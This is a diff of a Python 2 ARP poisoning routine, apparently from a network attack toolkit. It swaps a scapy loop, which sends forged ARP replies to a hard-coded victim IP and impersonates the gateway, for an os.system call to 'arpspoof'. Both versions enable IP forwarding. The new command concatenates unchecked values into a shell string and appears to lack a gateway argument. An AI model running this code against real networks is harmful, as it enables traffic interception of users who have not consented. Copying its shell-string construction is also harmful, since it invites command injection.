@@ -14,9 +14,7 @@ import sys                      #
 d=DESIGN()                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Libraries                     #
-from scapy.all import *         #
-import threading                #
-import sys                      #
+import os
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
@@ -78,18 +76,11 @@ def arpp(run):
         elif actions=="run"  or actions=="r":
             d.run()
             try:
-                print " "+Alr+" Ensure the victim recieves packets by forwarding them"
-                ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
-                op=1                    # Op code 1 for ARP requests
-                victim="192.168.1.210"  # Replace with Victims IP
-                spoof='192.168.1.254'   # Replace with Gateways IP
-                mac='10:FE:ED:1D:CB:CC' # Replace with Attackers Phys. Addr.
-                arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
-                while 1:
-                    print " "+Alr+" Send ARP's packets, Now ",send(arp)
-                    #time.sleep(2)
+                print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
+                print " "+Alr+" Startin ARP Poisoning."
+                os.system("arpspoof -i "+defaultint+" -t "+defaultipv)
             except:
-                Errors.Errors(event=sys.exc_info()[0], info=False)
+                Errors.Errors(event=sys.exc_info(), info=False)
         else:
             d.No_actions()
     except:
